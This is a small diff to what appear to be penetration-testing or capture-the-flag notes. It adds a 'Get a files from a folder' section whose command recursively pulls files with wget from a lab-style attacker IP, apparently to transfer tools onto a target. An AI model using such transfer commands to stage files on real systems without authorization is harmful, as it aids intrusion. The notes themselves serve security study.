@@ -7,6 +7,10 @@
 
 ![Pasted image 20220807171312](https://github.com/dbissell6/Shadow_Stone/assets/50979196/c6f33b8e-9620-4ce9-9ea0-853344b41170)
 
+### Get a files from a folder
+```
+wget -r -np http://10.10.14.98
+```
 
 ## From Attack to Windows
 
